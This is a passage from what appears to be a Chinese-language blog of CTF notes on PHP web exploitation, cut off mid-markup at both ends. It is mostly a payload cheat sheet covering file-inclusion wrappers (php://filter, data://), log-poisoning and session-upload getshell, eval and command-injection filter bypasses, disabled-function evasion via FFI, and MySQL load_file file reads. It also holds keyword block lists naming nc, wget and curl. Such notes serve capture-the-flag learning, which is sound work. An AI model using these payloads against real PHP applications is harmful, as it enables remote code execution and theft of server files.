class="variable">$fname</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$fname</span>.<span class="string">&quot;Zhang&quot;</span>;</span><br><span class="line">&#125;<span class="comment">//可实现注入 id=&#125;phpinfo();/* 一定要用多行注释</span></span><br></pre></td></tr></table></figure>
<h1 id="三、字符串"><a href="#三、字符串" class="headerlink" title="三、字符串"></a>三、字符串</h1><h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos"></a>strpos</h2><p>strpos() 函数是区分大小写的。<br>返回字符串在另一个字符串中第一次出现的位置。如果没有找到该字符串，则返回 false<br>绕过方法：1.利用换行（%0a）或+(%2b,如果是数字)进行绕过<br><code>if(!strpos($num, &quot;0&quot;))</code><br>2.大小写<br>3.目录穿越<br>4.数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br><span class="line">/ctfshow/../../../../<span class="keyword">var</span>/www/html/flag.php </span><br></pre></td></tr></table></figure>
<h2 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace"></a>str_replace</h2><p>用于替换字符串中指定字符（区分大小写）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str_replace(要查找的值,替换的值,被搜索的字符串,可选count)</span><br></pre></td></tr></table></figure>
<p>绕过：str_replace无法迭代过滤 ，可以通过双写绕过</p>
<h2 id="strtr"><a href="#strtr" class="headerlink" title="strtr"></a>strtr</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strtr</span>(<span class="keyword">string</span>,<span class="keyword">from</span>,to)</span><br><span class="line"><span class="title function_ invoke__">strtr</span>(<span class="keyword">string</span>,<span class="keyword">array</span>)</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;Hello&quot;</span> =&gt; <span class="string">&quot;Hi&quot;</span>, <span class="string">&quot;world&quot;</span> =&gt; <span class="string">&quot;earth&quot;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="四、md5、sha1"><a href="#四、md5、sha1" class="headerlink" title="四、md5、sha1"></a>四、md5、sha1</h1><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>) == </span><br><span class="line"><span class="string">&#x27;0e830400451993494058024219903391&#x27;</span></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="string">&#x27;240610708&#x27;</span>) == </span><br><span class="line"><span class="string">&#x27;0e462097431906509019562988736854&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="x3D-x3D-x3D-数组碰撞"><a href="#x3D-x3D-x3D-数组碰撞" class="headerlink" title="&#x3D;&#x3D;&#x3D;数组碰撞"></a>&#x3D;&#x3D;&#x3D;数组碰撞</h2><p>md5传入数组会返回NULL<br>[1] !&#x3D;&#x3D; [2] &amp;&amp; md5([1]) &#x3D;&#x3D;&#x3D; md5([2])</p>
<h1 id="五、运算符"><a href="#五、运算符" class="headerlink" title="五、运算符"></a>五、运算符</h1><h2 id="and"><a href="#and" class="headerlink" title="and"></a>and</h2><p>AND运算符和&amp;&amp;运算符的根本区别在于它们的优先级差异，但两者都执行相同的操作。<br>第一个表达式，<code>$bool = TRUE &amp;&amp; FALSE</code>; 计算结果为FALSE，因为执行了第一个&amp;&amp;操作，然后将结果赋值给变量<code>$bool</code>，因为&amp;&amp;运算符的优先级高于&#x3D;的优先级。<br>第二个表达式，<code>$bool = TRUE and FALSE</code>; 计算结果为TRUE，因为运算符”and”的优先级低于运算符”&#x3D;”，因此&#x3D;的右边的值TRUE被分配给<code>$bool</code>，然后”and”操作在内部执行但未分配，因此<code>$bool</code>现在保持为TRUE。</p>
<h2 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp; ||"></a>&amp;&amp; ||</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A &amp;&amp; B || C <span class="comment">//可不管A,B,只保证C为true</span></span><br></pre></td></tr></table></figure>

<h1 id="六、类"><a href="#六、类" class="headerlink" title="六、类"></a>六、类</h1><p>魔术方法<br>静态方法：不用实例化可以直接调用<br>调用方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="number">1</span>.ctfshow::<span class="title function_ invoke__">getFlag</span>()</span><br><span class="line"><span class="number">2</span>.ctfshow[<span class="number">0</span>]=ctfshow&amp;ctfshow[<span class="number">1</span>]=getFlag<span class="comment">//过滤冒号</span></span><br></pre></td></tr></table></figure>

<h2 id="内置类"><a href="#内置类" class="headerlink" title="内置类"></a>内置类</h2><p>1.反射类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"><span class="comment">// v1=ReflectionClass&amp;v2=system(&#x27;cat fl36dg.txt&#x27;)</span></span><br><span class="line"><span class="comment">//当新建ReflectionClass类并传入PHP代码时，会返回代码的运行结果，可以通过echo显示。即使传入了空的括号，代码依旧可以运行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;class&#x27;</span>);<span class="comment">//返回类信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">ReflectionObject</span>(<span class="variable">$student</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(getcwd);<span class="comment">//Function [ function getcwd ] &#123; - Parameters [0] &#123; &#125; &#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>2.Exception类<br>3.FilesystemIterator类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$iterator</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&#x27;.&#x27;</span>); <span class="comment">// 创建当前目录的迭代器,默认只显示第一个文件,需要遍历</span></span><br><span class="line"><span class="title function_ invoke__">getcwd</span>()<span class="comment">//获取当前工作目录</span></span><br></pre></td></tr></table></figure>

<h1 id="七、文件包含"><a href="#七、文件包含" class="headerlink" title="七、文件包含"></a>七、文件包含</h1><p>常用包含&#x2F;etc&#x2F;passwd来查看回显</p>
<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>?file&#x3D;php:&#x2F;&#x2F;<br>fuzz一下所有的伪协议</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);<span class="comment">//php://input读取post的data的内容作为文件</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=/flag</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);<span class="comment">//$str进行base64编码</span></span><br><span class="line"><span class="variable">$v3</span>=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php</span></span><br><span class="line">若base64在黑名单，可绕过：</span><br><span class="line">php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br><span class="line">若php:<span class="comment">//在黑名单：</span></span><br><span class="line">compress.zlib:<span class="comment">//flag.php</span></span><br><span class="line">file:<span class="comment">///</span></span><br><span class="line">dict:<span class="comment">//</span></span><br><span class="line">sftp:<span class="comment">//</span></span><br><span class="line">ldap:<span class="comment">//</span></span><br><span class="line">tftp:<span class="comment">//</span></span><br><span class="line">gopher:<span class="comment">//</span></span><br><span class="line">data:text/plain,<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span> <span class="comment">//可去掉双斜杠</span></span><br><span class="line">data:<span class="comment">//text/plain;base64,poc</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/30/m8KGvD1UWVBpZe6.png" alt="20220530222004"></p>
<h2 id="日志getshell"><a href="#日志getshell" class="headerlink" title="日志getshell"></a>日志getshell</h2><p>先在user-agent写shell，url不带参数<br>再包含&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
<h2 id="利用session对话"><a href="#利用session对话" class="headerlink" title="利用session对话"></a>利用session对话</h2><p>php中的session.upload_progress，当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中<br>session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;TGAO，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session<br>利用PHP_SESSION_UPLOAD_PROGRESS&#x3D;””把内容写入&#x2F;tmp&#x2F;sess_TGAO</p>
<h2 id="利用php-x2F-x2F-filter绕开exit"><a href="#利用php-x2F-x2F-filter绕开exit" class="headerlink" title="利用php:&#x2F;&#x2F;filter绕开exit"></a>利用php:&#x2F;&#x2F;filter绕开exit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">php:<span class="comment">//filter/write=string.strip_tags|convert.base64-decode/resource=1.php</span></span><br><span class="line">php:<span class="comment">//filter/write=string.rot13/resource=1.php</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码<br>先strip_tags绕exit，再用base64还原</p>
</blockquote>
<h1 id="八、变量"><a href="#八、变量" class="headerlink" title="八、变量"></a>八、变量</h1><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>flag In the variable </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>);<span class="comment">//?args=GLOBALS</span></span><br></pre></td></tr></table></figure>
<p>_()&#x3D;&#x3D;gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(_,<span class="string">&quot;get_defined_vars&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">_</span>(<span class="string">&quot;get_defined_vars&quot;</span>)=get_defined_vars</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(get_defined_vars)</span><br></pre></td></tr></table></figure>
<h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]</span><br><span class="line">GET:?a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">GET:?<span class="variable">$fl0g</span>=flag_give_me</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">assert</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];<span class="comment">//url的?后的所有内容</span></span><br></pre></td></tr></table></figure>

<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?F=`<span class="variable">$F</span>`;空格sleep <span class="number">3</span><span class="comment">//好像网站确实sleep了一会说明的确执行了命令</span></span><br><span class="line">``是<span class="title function_ invoke__">shell_exec</span>()函数的缩写</span><br><span class="line">先进行<span class="title function_ invoke__">substr</span>()函数截断然后去执行<span class="keyword">eval</span>()函数,即<span class="keyword">eval</span>(<span class="string">&quot;`<span class="subst">$F</span>`;空格&quot;</span>)</span><br><span class="line">而<span class="variable">$F</span>就是我们输入的`<span class="variable">$F</span>`;空格sleep <span class="number">3</span></span><br><span class="line">即最终效果是<span class="keyword">eval</span>(`sleep <span class="number">3</span>`);<span class="comment">//注意eval(``),exec,system是shell命令，而且只能输入shell命令，不会在网站显示,system成功则返回命令输出的最后一行</span></span><br><span class="line"><span class="comment">//解决方法</span></span><br><span class="line"><span class="comment">//1.oob</span></span><br><span class="line"><span class="comment">//2.写入文件，用&gt;或|tee</span></span><br><span class="line"><span class="comment">//3.命令盲注 //.被过滤</span></span><br></pre></td></tr></table></figure>
<h1 id="九、命令执行"><a href="#九、命令执行" class="headerlink" title="九、命令执行"></a>九、命令执行</h1><p><code>system($c)</code>会有回显，只是phpstudy无法显示</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php函数</span></span><br><span class="line">include|require</span><br><span class="line">system|<span class="built_in">exec</span>|passthru|shell_exec <span class="comment">#exec(&quot;cat /f149_15_h3r3|tee 1&quot;);</span></span><br><span class="line"><span class="comment">#命令行命令</span></span><br><span class="line">bash|sh</span><br><span class="line">nc|netcat|wget|curl|ping</span><br><span class="line"><span class="built_in">cat</span>|grep|<span class="built_in">tac</span>|more|<span class="built_in">od</span>|<span class="built_in">sort</span>|<span class="built_in">tail</span>|less|<span class="built_in">base64</span>|rev|<span class="built_in">cut</span>|<span class="built_in">od</span>|strings|tailf|<span class="built_in">head</span>|<span class="built_in">nl</span></span><br></pre></td></tr></table></figure>
<p>已知flag在flag.php里</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.注释，如`<span class="variable">$v2</span>=<span class="comment">/*,$v3=*/</span>` </span><br><span class="line"><span class="number">2</span>.命令分隔符;如<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">还可以用&amp;&amp;,||,&amp;执行前一条命令,如ls||tac</span><br><span class="line">|执行后一条命令</span><br><span class="line">记得特殊符号要url编码</span><br><span class="line"><span class="number">3</span>.过滤flag等关键字</span><br><span class="line">可用通配符*?[]等代替，cat f*代替,</span><br><span class="line">或<span class="keyword">eval</span>(<span class="keyword">echo</span> `n<span class="string">&#x27;&#x27;</span>l fl<span class="string">&#x27;&#x27;</span>ag.ph<span class="string">&#x27;&#x27;</span>p`);<span class="comment">//两引号分隔在shell中执行会自动忽略</span></span><br><span class="line">技巧:用tac而不是cat可以不用查看源代码，因破坏了php格式</span><br><span class="line"><span class="number">4</span>.过滤system等可用``代替，<span class="keyword">eval</span>,``相当于把数据段<span class="string">&quot;&quot;</span>变成了代码段</span><br><span class="line"><span class="number">5</span>.过滤空格的代替：</span><br><span class="line"><span class="keyword">print</span>或<span class="keyword">echo</span>`cat f*` <span class="comment">//echo之间不用加空格</span></span><br><span class="line">换行符：\n=&gt;%<span class="number">0</span>a <span class="comment">//echo%0a`不可用%0a`</span></span><br><span class="line">回车：\r=&gt;%<span class="number">0</span>d <span class="comment">//echo%0d`不可用%0d`</span></span><br><span class="line">水平制表符:\t=&gt;%<span class="number">09</span> <span class="comment">//`可用`</span></span><br><span class="line">垂直制表符：\v=&gt;%<span class="number">0</span>b <span class="comment">// echo%0b`不可用%0b`</span></span><br><span class="line">特殊零字符，也可以表示<span class="literal">NULL</span>值:\<span class="number">0</span>=&gt;%<span class="number">00</span></span><br><span class="line">换页键:\f=&gt;%<span class="number">0</span>c <span class="comment">//echo%0c`不可用%0c`</span></span><br><span class="line">重定向读取如`nl&lt;fla<span class="string">&#x27;&#x27;</span>g.php||` <span class="comment">//注意不支持通配符</span></span><br><span class="line">没过滤`$`的话可用tac$&#123;IFS&#125;flag.txt</span><br><span class="line"><span class="number">6</span>.参数逃逸 --有很多限制时可以试试</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$c</span>);<span class="comment">//对$c做了限制</span></span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="comment">//构造不受限的参数1</span></span><br><span class="line"><span class="variable">$_GET</span>&#123;abs&#125;;</span><br><span class="line"><span class="number">7</span>.过滤括号和分号</span><br><span class="line">a.使用包含:c=<span class="keyword">require</span>或<span class="keyword">include</span>%<span class="number">0</span>a<span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">// //过滤),(,;</span></span><br><span class="line"><span class="comment">//最后一句可不用分号,但这样的话必须有闭合标签才行</span></span><br><span class="line"><span class="comment">//eval等函数的括号可以不闭合，只需令c=phpinfo()?&gt;</span></span><br><span class="line">实际效果：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;(&#x27;phpinfo&#x27;)()?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">b.使用语言结构:<span class="keyword">echo</span> <span class="keyword">print</span> <span class="keyword">isset</span> <span class="keyword">unset</span> <span class="variable">$_GET</span>[<span class="number">1</span>]</span><br><span class="line"><span class="number">8</span>.c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));<span class="comment">//不过滤括号和分号时的通解</span></span><br><span class="line"><span class="title function_ invoke__">localeconv</span>()<span class="comment">//函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是. =&gt;为了拿到.</span></span><br><span class="line"><span class="title function_ invoke__">pos</span>()/<span class="title function_ invoke__">current</span>()<span class="comment">//函数返回数组第一个值 =&gt;拿到.</span></span><br><span class="line"><span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>)<span class="comment">//这个函数的作用是扫描当前目录</span></span><br><span class="line"><span class="comment">//顺序是array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(7) &quot;flag.py&quot; [3]=&gt; string(9) &quot;index.php&quot; &#125;</span></span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>()<span class="comment">//数组颠倒</span></span><br><span class="line"><span class="title function_ invoke__">next</span>()<span class="comment">//将数组指针一项下一位</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>()<span class="comment">//读取函数内容</span></span><br><span class="line"><span class="number">9</span>. c=<span class="title function_ invoke__">session_start</span>();<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">session_id</span>());</span><br><span class="line">PHPSESSID=ls</span><br><span class="line"><span class="number">10</span>.c=<span class="keyword">eval</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">get_defined_vars</span>())));<span class="comment">//注意必须要有2个eval</span></span><br><span class="line">post:<span class="number">1</span>=<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//实现参数逃逸到POST</span></span><br><span class="line"><span class="number">11</span>.过滤引号</span><br><span class="line"><span class="variable">$_GET</span>[a]字母是可以不加引号的</span><br><span class="line"><span class="number">12</span>.位运算构造绕过正则,但要在<span class="keyword">eval</span>等能执行php代码的函数里面才能执行位运算，system不行</span><br><span class="line"><span class="number">13</span>.通过重命名或复制绕过文件读取(注意要有权限)</span><br><span class="line">cp flag.php a.txt<span class="comment">//再访问a.txt</span></span><br><span class="line"><span class="number">14</span>.通过phpinfo查看禁用函数，再fuzz。(参数逃逸无效，因禁用是全局的)</span><br><span class="line">文件读取函数：readfile,file_get_content,highlight_file,show_source</span><br><span class="line">目录搜索：<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">文件包含+伪协议或<span class="variable">$flag</span>：<span class="keyword">include</span>,<span class="keyword">require</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]) </span><br><span class="line">执行shell命令：exec,system,shell_exec,passthru</span><br><span class="line">包含后读取变量：<span class="keyword">echo</span> <span class="variable">$flag</span>;<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>()/<span class="variable">$GLOBALS</span>)</span><br><span class="line">重命名和复制：rename,copy</span><br><span class="line"><span class="number">15</span>.缓冲区替换绕过：</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();<span class="comment">//output buffer</span></span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">绕过方法：</span><br><span class="line">中断:<span class="keyword">exit</span>,<span class="keyword">die</span></span><br><span class="line"><span class="number">16</span>.glob协议进行目录扫描(遇到权限限制open_basedir restriction时)</span><br><span class="line">c=<span class="variable">$a</span>=<span class="string">&quot;glob:///*.txt&quot;</span>;<span class="comment">//定义路径</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>))!==<span class="literal">false</span>)&#123;<span class="comment">//如果它不是目录</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;filename:&quot;</span>.<span class="variable">$file</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line">uaf脚本绕过安全目录(利用php的垃圾回收机制漏洞)(记得url编码)</span><br><span class="line"><span class="number">17</span>.调用其他应用如mysql来访问文件</span><br><span class="line">c=<span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;</span><br><span class="line">    <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">18</span>.蚁剑绕过disabled functions</span><br><span class="line"><span class="number">19</span>.FFI，php7.<span class="number">4</span>以上才有</span><br><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//创建一个system对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="comment">//没有回显的</span></span><br><span 